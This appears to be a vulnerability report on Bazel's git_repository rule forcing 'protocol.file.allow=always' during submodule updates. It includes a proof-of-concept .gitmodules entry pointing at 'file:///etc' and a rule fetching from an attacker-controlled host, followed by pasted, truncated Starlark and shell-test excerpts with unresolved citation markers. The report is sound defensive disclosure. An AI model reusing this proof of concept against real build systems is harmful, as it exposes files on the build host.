### Title
Bazel's `git_repository` submodule handling reintroduces the Git file:// submodule-URL disclosure vulnerability by forcing `protocol.file.allow=always` - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
`git_repository`/`new_git_repository` clone an attacker-influenceable remote (a dependency hosted anywhere, or an untrusted CI branch) and, when `init_submodules`/`recursive_init_submodules` is enabled, run `git submodule update` with the config override `-c protocol.file.allow=always`. This unconditionally re-enables the `file://` transport for submodule URLs taken from the untrusted repository's own `.gitmodules`, defeating the protection Git added specifically to stop submodule URLs from being used to pull arbitrary local paths into the checkout — the same bug class as CVE-2018-7032 (an unsanitized, remotely supplied URL is handed to a VCS clone operation, letting the remote content control which transport/target is used).

### Finding Description
`update_submodules` in [1](#0-0)  runs:
```
_git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", ...)
```
The accompanying comment explains why: [1](#0-0) 

Modern Git (≥2.38) defaults `protocol.file.allow` so that `file://` submodule URLs are rejected when the submodule operation is invoked automatically (as `git submodule update` is here), precisely to stop a hostile repository's `.gitmodules` from directing the client to fetch from an arbitrary local path on the machine performing the clone. By passing `-c protocol.file.allow=always` on every `git` invocation for the repo (via `_execute`, which every submodule/fetch/clone call goes through) [2](#0-1) , Bazel globally disables that protection for the whole `git_repository` fetch, not just for the legitimate local-test-fixture case referenced in bazel issue #17040.

The `remote` URL of the top-level repository is attacker-reachable in the threat model described (an outsider who publishes a dependency the victim's build consumes, or content on an untrusted branch that CI builds), and once cloned, the content of `.gitmodules` inside that repository is entirely attacker-controlled. `fetch`/`reset`/`clean`/`update_submodules` never sanitize or restrict the submodule URLs found in that file [3](#0-2) ; they are handed straight to `git submodule update` with the file-transport safety net removed.

### Impact Explanation
An attacker who controls (or can get consumed as) a `git_repository`/`new_git_repository` remote can embed a `.gitmodules` entry such as `url = file:///absolute/path/on/build/host`. When the victim's Bazel build enables `init_submodules` (a common, legitimate setting for repos that use submodules), Bazel's forced `protocol.file.allow=always` makes Git honor that local-filesystem URL and materialize the referenced local path's contents into the workspace's external repository directory — an out-of-repository read of the build host's filesystem driven entirely by untrusted, remotely supplied content. This is exactly the class of "unsanitized URL handed to a VCS clone operation, enabling access outside the intended scope" that CVE-2018-7032 describes for `myrepos`/`git clone`.

### Likelihood Explanation
No MITM or credential access is required — only that the victim's build fetches from a `git_repository`/`new_git_repository` whose remote content is attacker-influenced and that `init_submodules`/`recursive_init_submodules` is enabled (a common pattern for C++/vendored dependencies that use submodules). The override is unconditional and applies on every default build; there is no flag to opt out of `protocol.file.allow=always` short of not using submodule init at all.

### Recommendation
Do not globally force `protocol.file.allow=always` for all Git operations. Instead:
- Scope the override to only the specific local-repository-for-testing use case (e.g., only when the top-level `remote` itself is a `file://` path), or
- Explicitly set `protocol.file.allow=user`/`deny` for submodule operations against non-`file://` remotes, restoring Git's upstream default protection for the common (network remote) case, or
- Validate/allowlist submodule URL schemes read from `.gitmodules` before calling `git submodule update`.

### Proof of Concept
1. Set up an "upstream" bare repo `victim.git` containing a `.gitmodules` file:
   ```
   [submodule "leak"]
       path = leak
       url = file:///etc
   ```
   (commit a `leak` gitlink pointing at a path/commit reachable from that local repo).
2. In a `WORKSPACE`/`MODULE.bazel`, add:
   ```
   git_repository(
       name = "dep",
       remote = "https://attacker-controlled-host/victim.git",
       commit = "<pinned commit>",
       init_submodules = True,
   )
   ```
3. Run `bazel build @dep//...`. Bazel's `_execute` runs `git -c core.fsmonitor=false ... -c protocol.file.allow=always submodule update --init --checkout --force` [1](#0-0) , causing Git to clone from the attacker-specified `file:///etc` path into `external/+git_repository+dep/leak`, even though a stock Git client invoked the same way (without Bazel's override) would refuse this with "submodule.file: NOT allowed" — demonstrating the local-path disclosure enabled purely by Bazel's forced config. A JUnit/`src/test/shell/bazel` test extending the existing `starlark_git_repository_test.sh` harness [4](#0-3)  can assert that the checked-out submodule directory now contains contents copied from the out-of-repo local path.

def fetch(ctx, git_repo):
    args = ["fetch", "origin"]

    sparse_checkout_patterns_or_file = \
        getattr(ctx.attr, "sparse_checkout_patterns", None) or \
        getattr(ctx.attr, "sparse_checkout_file", None)
    if sparse_checkout_patterns_or_file:
        if _git_sparse_checkout_config(ctx, git_repo):
            # Use filter to disable downloading file contents until we set the `sparse-checkout` patterns.
            args.append("--filter=blob:none")
        else:
            print("WARNING: Sparse checkout is not supported. Doing a full checkout.")
            sparse_checkout_patterns_or_file = None

    args.extend(["--", git_repo.fetch_ref])
    st = _git_maybe_shallow(ctx, git_repo, *args)

    if sparse_checkout_patterns_or_file:
        _git_sparse_checkout(ctx, git_repo, sparse_checkout_patterns_or_file)

    if st.return_code == 0:
        return
    if ctx.attr.commit:
        # Perhaps uploadpack.allowReachableSHA1InWant or similar is not enabled on the server;
        # fall back to fetching all branches, tags, and history.
        # The semantics of --tags flag of git-fetch have changed in Git 1.9, from 1.9 it means
        # "everything that is already specified and all tags"; before 1.9, it used to mean
        # "ignore what is specified and fetch all tags".
        # The arguments below work correctly for both before 1.9 and after 1.9,
        # as we directly specify the list of references to fetch.
        _report_progress(ctx, git_repo, shallow_failed = True)
        _git(
            ctx,
            git_repo,
            "fetch",
            "origin",
            "--",
            "refs/heads/*:refs/remotes/origin/*",
            "refs/tags/*:refs/tags/*",
        )
    else:
        _error(ctx.name, ["git"] + args, st.stderr)

def reset(ctx, git_repo):
    _git(ctx, git_repo, "reset", "--hard", git_repo.reset_ref)

def clean(ctx, git_repo):
    _git(ctx, git_repo, "clean", "-xdf")

def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")

def _execute(ctx, git_repo, args):
    # "core.fsmonitor=false" disables git from spawning a file system monitor which can cause hangs when cloning a lot.
    # See https://github.com/bazelbuild/bazel/issues/21438
    start = ["git", "-c", "core.fsmonitor=false"]
    return ctx.execute(
        start + args,
        environment = ctx.os.environ | _GIT_LOCAL_ENV_VARS,
        working_directory = str(git_repo.directory),
    )

function test_git_repository_refetched_when_commit_changes() {
  # Testing refetch behavior, so disable the repo contents cache
  add_to_bazelrc "common --repo_contents_cache="
  local repo_dir=$TEST_TMPDIR/repos/refetch

  rm MODULE.bazel
  cat >> MODULE.bazel <<EOF
git_repository = use_repo_rule('@bazel_tools//tools/build_defs/repo:git.bzl', 'git_repository')
git_repository(name='g', remote='$repo_dir', commit='22095302abaf776886879efa5129aa4d44c53017', verbose=True)
EOF

  bazel build @g//:g >& $TEST_log || fail "Build failed"
  expect_log "Cloning"

git_repository = use_repo_rule('@bazel_tools//tools/build_defs/repo:git.bzl', 'git_repository')
